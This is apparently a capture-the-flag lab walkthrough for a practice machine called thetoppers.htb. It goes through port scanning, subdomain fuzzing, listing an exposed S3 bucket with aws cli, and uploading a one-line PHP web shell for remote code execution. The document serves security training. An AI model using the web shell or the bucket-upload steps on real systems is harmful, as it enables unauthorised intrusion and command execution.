Vulnerability: Insecure File Upload in AWS S3 Bucket

<br>

Requirements:
- aws cli - (`sudo apt-get install awscli`)

<br>

## Steps:
1. Conducting an Nmap scan to the given IP, will result to 2 open TCP ports (22 and 80).

    ```
    Nmap scan report for 10.129.113.143
    Host is up (0.57s latency).
    Not shown: 998 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    ```

    > Note: Finding a port 80 means that there is a web application.

2. Browsing the web app (http://ip), the domain/hostname can be found in the contact section in the email address (mail@thetoppers.htb) - **thetoppers.htb**.

3. Given the IP address and the domain, add the ip address with the corresponding hostname in the /etc/hosts file.
    Edit the hosts file using `sudo nano /etc/hosts/` or `sudo subl /etc/hosts/`.

    ```
    [snip]

    10.129.113.143   thetoppers.htb
    ```

4. Now, the web application is accessible using http://thetoppers.htb/ 

5. Enumerating subdomains using `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -fw 1832`, s3.thetoppers.htb is present. And navigating to http://s3.thetoppers.htb/ results to:

    > This is a Amazon S3 service

6. Knowing this is an Amazon S3 service, there is a tool in command line called `aws cli`. Install aws cli in Kali.

7. Configure the AWS using `aws configure`, inputting just '`a`' will suffice.

8. List the contents of the bucket using `aws s3 ls s3://thetoppers.htb`.

9. Should specify the endpoint `--endpoint http://thetoppers.htb`. Now the contents of the S3 bucket is listed. Also PHP as scripting language is known that the application used (index.php).

10. We can try uploading a malicious file using `aws s3 cp s3://`


11. First, we need a malicious file (reverse shell).
    
    ```php
    <?php system($_GET['cmd']); ?>
    ```
12. Now we can upload the file using this command `aws s3 --endpoint=http://s3.thetoppers.htb cp /home/kali/Desktop/transfer/shell.php s3://thetoppers.htb`.
    ![12](/assets/img/three/12.png)

13. Going back to the web application, a remote code execution is now possible.
